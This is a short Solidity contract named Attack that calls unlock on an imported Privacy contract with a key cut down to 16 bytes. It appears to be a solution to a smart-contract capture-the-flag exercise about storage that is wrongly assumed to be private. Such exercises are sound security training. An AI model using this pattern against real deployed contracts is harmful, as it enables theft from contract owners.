pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    function attack(address _privacy, bytes32 _key) public {
        Privacy privacy = Privacy(_privacy);
        privacy.unlock(bytes16(_key));
    }
}
